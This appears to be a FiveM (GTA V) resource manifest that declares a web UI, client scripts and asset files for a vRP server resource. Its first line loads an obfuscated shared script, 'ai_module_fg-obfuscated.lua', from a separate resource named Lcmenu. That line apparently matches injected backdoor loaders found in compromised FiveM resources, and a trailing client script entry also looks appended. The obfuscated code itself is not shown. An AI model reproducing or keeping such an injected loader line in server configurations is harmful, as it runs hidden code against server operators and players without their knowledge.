shared_script '@Lcmenu/ai_module_fg-obfuscated.lua'
fx_version "bodacious"
game "gta5"
lua54 "yes"

ui_page "web-side/index.html"

client_scripts {
	"@vrp/config/Native.lua",
	"client-side/*"
}

files {
	"web-side/*",
	"web-side/**/*"
}
client_script "scripting_lua.lua"